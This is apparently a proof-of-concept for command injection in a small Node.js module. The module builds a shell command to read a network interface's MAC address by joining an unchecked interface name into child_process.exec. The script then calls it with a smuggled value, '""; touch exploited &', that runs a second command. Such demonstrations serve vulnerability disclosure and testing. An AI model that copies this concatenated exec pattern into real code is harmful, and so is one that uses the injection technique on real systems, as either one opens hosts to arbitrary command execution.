var exec = require('child_process').exec;

module.exports = function (iface, callback) {
    exec("cat /sys/class/net/" + iface + "/address", function (err, out) {
        if (err) {
            callback(err, null);
            return;
        }
        callback(null, out.trim().toLowerCase());
    });
};


const payload = '""; touch exploited &';

const cb = function(e, d) {

}

module.exports(payload, cb);